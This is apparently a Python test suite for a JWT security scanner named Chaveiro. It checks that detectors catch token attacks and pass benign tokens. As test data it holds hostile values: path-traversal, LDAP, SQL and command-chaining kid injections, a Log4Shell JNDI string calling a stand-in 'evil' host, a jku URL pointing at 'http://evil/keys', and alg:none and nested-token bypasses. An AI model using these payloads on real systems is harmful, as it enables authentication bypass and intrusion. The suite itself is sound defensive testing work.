"""Invariantes das correções da auditoria cruzada de FP/FN do Chaveiro (2026-08-28/29).

Cada teste ataca a CLASSE. Para uma tool de SEGURANÇA, o falso NEGATIVO (deixar passar um
kid-injection percent-encoded, uma assinatura vazia, um alg:none aninhado) é tão grave quanto
o falso positivo — ambos aqui.
"""

from __future__ import annotations

from chaveiro.checks.detectors import run_all
from chaveiro.core.jwt import b64url_encode, decode
from tests.conftest import hs_token, raw_token

NOW = 1_800_000_000


def _ids(token: str, now: int = NOW) -> set[str]:
    return {f.check_id for f in run_all(decode(token), now)}


# ---------------------- FP: kid legítimo não é injeção ----------------------
def test_kid_base64_url_e_hierarquico_nao_sao_injecao() -> None:
    for kid in ("abc/def+gh=", "https://issuer.example/keys/2024", "ns/subsystem/key-1"):
        assert "header-kid-injection" not in _ids(hs_token({"sub": "a"}, kid=kid))


def test_es256k_e_algoritmo_conhecido() -> None:
    assert "alg-unknown" not in _ids(raw_token({"alg": "ES256K"}, {"sub": "a"}))


def test_refresh_token_keycloak_nao_e_vida_longa() -> None:
    tok = hs_token({"exp": NOW + 30 * 24 * 3600, "iat": NOW}, typ="Refresh")
    assert "claim-long-lifetime" not in _ids(tok)


def test_claims_de_metadata_de_senha_nao_sao_segredo() -> None:
    payload = {
        "pwd_exp": NOW + 999,
        "password_changed_at": NOW - 10,
        "has_password": True,
        "pwdLastSet": NOW - 100,
        "pwd_url": "https://portal/troca-senha",
        "password_policy": {"min": 8},
    }
    assert "payload-sensitive" not in _ids(hs_token(payload))


def test_segredo_em_claro_ainda_e_pego() -> None:  # contraprova
    assert "payload-sensitive" in _ids(hs_token({"client_secret": "s3cr3t-real-value"}))


# ---------------------- FN: injeção de kid em todas as formas ----------------------
def test_kid_injection_percent_encoded_ldap_sqli_e_chaining() -> None:
    for kid in ("%2e%2e%2fetc%2fpasswd", "*)(uid=*", "x' OR 1=1", "a && whoami", "../../secret"):
        assert "header-kid-injection" in _ids(hs_token({"sub": "a"}, kid=kid)), kid


# ---------------------- FN: alg:none normalizado (zero-width) ----------------------
def test_alg_none_com_zero_width_space() -> None:
    assert "alg-none" in _ids(raw_token({"alg": "none​"}, {"sub": "a"}))


def test_homoglifo_cirilico_nao_e_alg_none() -> None:  # contraprova: não é bypass real
    assert "alg-none" not in _ids(raw_token({"alg": "n" + chr(0x43E) + "ne"}, {"sub": "a"}))


# ---------------------- FN: assinatura vazia num algoritmo de assinatura ----------------------
def test_assinatura_vazia_em_rs256_e_hs256() -> None:
    assert "signature-empty" in _ids(raw_token({"alg": "RS256"}, {"sub": "a"}))
    assert "signature-empty" in _ids(raw_token({"alg": "HS256"}, {"sub": "a"}))


# ---------------------- FN: iat no futuro ----------------------
def test_iat_no_futuro() -> None:
    assert "claim-iat-future" in _ids(
        hs_token({"iat": NOW + 5 * 365 * 24 * 3600, "exp": NOW + 5 * 365 * 24 * 3600 + 60})
    )


# ---------------------- FN: Bearer prefix e token multilinha ----------------------
def test_bearer_prefix_e_multilinha() -> None:
    base = raw_token({"alg": "none"}, {"sub": "admin"})
    assert "alg-none" in _ids("Bearer " + base)
    h, p, s = base.split(".")
    assert "alg-none" in _ids(f"{h}.\n{p}.\n{s}")


# ---------------------- FN: header com chave duplicada (parser-differential) ----------------------
def test_header_alg_duplicado_first_wins() -> None:
    h = b64url_encode(b'{"alg":"none","alg":"HS256","typ":"JWT"}')
    p = b64url_encode(b'{"sub":"a"}')
    tok = f"{h}.{p}."
    ids = _ids(tok)
    assert "header-duplicate-key" in ids and "alg-none" in ids


# ---------------------- FN: JWT aninhado com miolo alg:none ----------------------
def test_nested_jwt_com_interno_none() -> None:
    interno = raw_token({"alg": "none"}, {"role": "admin"})
    casca = hs_token({}, cty="JWT")  # payload vazio; forçamos o aninhado abaixo
    h, _, sig = casca.split(".")
    tok = f"{h}.{b64url_encode(interno.encode())}.{sig}"
    ids = _ids(tok)
    assert "payload-nested-jwt" in ids and "alg-none" in ids


# ===================================================================================
# Segunda onda (2026-08-30): buracos que o cetico adversarial provou. Cada teste ataca
# a CLASSE (pertinencia `in`/`not in`, com contraprova do benigno correspondente).
# ===================================================================================


def _wrap(interno_raw: str, **hdr: object) -> str:
    """Casca HS256 cujo payload E o token interno (JWT aninhado real, RFC 7519 §5.2)."""
    casca = hs_token({}, cty="JWT", **hdr)
    h, _, sig = casca.split(".")
    return f"{h}.{b64url_encode(interno_raw.encode())}.{sig}"


# ---------------------- H1: aninhamento auditado RECURSIVAMENTE e por INTEIRO ----------------------
def test_h1_alg_none_no_miolo_a_tres_niveis() -> None:
    # Casca -> casca -> miolo alg:none. Antes so 1 nivel + so check_alg -> invisivel.
    miolo = raw_token({"alg": "none"}, {"role": "admin"})
    assert "alg-none" in _ids(_wrap(_wrap(miolo)))


def test_h1_jku_kid_e_segredo_dentro_do_aninhado() -> None:
    # A bateria COMPLETA roda em cada camada: header (jku/kid) e payload (segredo), nao so alg.
    assert "header-jku" in _ids(
        _wrap(raw_token({"alg": "HS256", "jku": "http://evil/keys"}, {"sub": "a"}))
    )
    assert "header-kid-injection" in _ids(
        _wrap(raw_token({"alg": "HS256", "kid": "../../etc/passwd"}, {"sub": "a"}))
    )
    assert "payload-sensitive" in _ids(
        _wrap(raw_token({"alg": "HS256"}, {"client_secret": "s3cr3t-real-value"}))
    )


def test_h1_aninhamento_nao_entra_em_laco_nem_estoura() -> None:  # contraprova: teto/ciclo
    # Cadeia funda alem do teto termina sem crash e ainda audita as camadas dentro do teto.
    tok = raw_token({"alg": "none"}, {"role": "admin"})
    for _ in range(8):
        tok = _wrap(tok)
    ids = _ids(tok)  # nao deve levantar
    assert "payload-nested-jwt" in ids


# ---------------------- H2: kid — unquote ate ponto-fixo + NFKC + metacaracteres ----------------------
def test_h2_kid_double_encoding_el_fullwidth_abspath() -> None:
    perigosos = (
        "%252e%252e%252fetc%252fpasswd",  # double-encoding -> ../etc/passwd
        "app & whoami",  # '&' sozinho (nao so '&&')
        "${jndi:ldap://evil/a}",  # EL / JNDI (Log4Shell)
        chr(0xFF0E) * 2 + chr(0xFF0F),  # fullwidth "../" (U+FF0E/FF0F) colapsa em ../ sob NFKC
        "/etc/passwd",  # caminho absoluto
    )
    for kid in perigosos:
        assert "header-kid-injection" in _ids(hs_token({"sub": "a"}, kid=kid)), kid


def test_h2_kid_legitimo_estavel_sob_fixpoint_e_nfkc_nao_dispara() -> None:  # contraprova
    for kid in (
        "abc/def+gh=",
        "keys/prod/1",
        "a7Bc+/dE9fG0hIjK1LmN2oPq3rS4tUv6wXyZ8A==",
        "https://issuer.example/keys/2024",
        "urn:example:key:2026",
        "2019-05-01",
    ):
        assert "header-kid-injection" not in _ids(hs_token({"sub": "a"}, kid=kid)), kid


# ---------------------- H3: payload-sensitive re-incluido por SINAL do valor ----------------------
def test_h3_segredo_url_numerico_lista_e_chave_metadata() -> None:
    casos = (
        {"notify": "https://hooks.slack.com/services/T00/B00/XXXXXXXXXXXX"},  # webhook Slack
        {"cb": "https://user:p4ss@host/x"},  # userinfo basic-auth
        {"link": "https://b.s3.amazonaws.com/k?X-Amz-Signature=deadbeef"},  # presigned S3
        {"password": 123456},  # segredo numerico
        {"api_keys": ["AKIAIOSFODNN7EXAMPLE"]},  # lista de segredos
        {"api_key_url": "AKIAIOSFODNN7EXAMPLE"},  # segredo sob chave _url (metadata)
    )
    for payload in casos:
        assert "payload-sensitive" in _ids(hs_token(payload)), payload


def test_h3_placeholder_e_policy_numerica_nao_disparam() -> None:  # contraprova
    for payload in (
        {"client_secret": "${CLIENT_SECRET}"},
        {"secret": "<your-secret>"},
        {"api_key": "changeme"},
        {"settings": {"password_expires_days": 90}},
    ):
        assert "payload-sensitive" not in _ids(hs_token(payload)), payload
    # e o segredo real segue pego:
    assert "payload-sensitive" in _ids(hs_token({"client_secret": "s3cr3t-real-value"}))


# ---------------------- H4: signature-empty x alg-none normalizado (zero-width) ----------------------
def test_h4_none_com_zero_width_nao_gera_signature_empty() -> None:
    ids = _ids(raw_token({"alg": "none​"}, {"sub": "a"}))  # raw_token: assinatura vazia
    assert "alg-none" in ids and "signature-empty" not in ids


def test_h4_rs256_com_assinatura_vazia_ainda_e_signature_empty() -> None:  # contraprova
    assert "signature-empty" in _ids(raw_token({"alg": "RS256"}, {"sub": "a"}))


# ---------------------- H5: long-lifetime nao e suprimido por typ:Refresh self-asserted ----------------------
def test_h5_access_longo_com_scope_e_typ_refresh_nao_e_suprimido() -> None:
    tok = hs_token({"exp": NOW + 30 * 24 * 3600, "iat": NOW, "scope": "admin"}, typ="Refresh")
    assert "claim-long-lifetime" in _ids(tok)


def test_h5_refresh_sem_sinais_de_acesso_segue_suprimido() -> None:  # contraprova
    tok = hs_token({"exp": NOW + 30 * 24 * 3600, "iat": NOW}, typ="Refresh")
    assert "claim-long-lifetime" not in _ids(tok)
